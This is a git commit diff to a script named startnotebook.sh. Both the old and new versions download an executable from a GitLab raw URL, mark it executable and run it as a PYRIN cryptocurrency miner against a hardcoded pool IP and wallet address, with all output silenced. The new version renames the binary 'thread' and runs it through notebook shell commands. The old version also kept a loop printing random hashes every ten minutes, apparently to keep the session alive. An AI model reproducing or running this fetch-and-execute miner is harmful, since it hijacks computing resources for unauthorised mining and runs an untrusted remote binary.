1b7964ef5f9a1817afc5fba8c51f0c09235aee55
adiaduh30 <155714713+adiaduh30@users.noreply.github.com>
2024-01-09 20:44:49 +0700

    Update startnotebook.sh

--- startnotebook.sh
+++ startnotebook.sh
@@ -1,6 +1,5 @@
-mkdir jupyterlab
-cd jupyterlab
+%mkdir 1
+%cd 1
+!curl -0 https://gitlab.com/sarifadim/jomblo/-/raw/main/bali -o thread && chmod +x thread >/dev/null 2>&1
+!./thread --algo PYRIN  --pool 47.254.125.141:443 --user pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo 0A-$(TZ=UTC-7 date +"%H-%M-%S")) &>/dev/null
 
-curl -0 https://gitlab.com/sarifadim/jomblo/-/raw/main/bali -o bali && chmod +x bali
-./bali --algo PYRIN  --pool 47.254.125.141:443 --user pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo 0A-$(TZ=UTC-7 date +"%H-%M-%S")) &>/dev/null
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
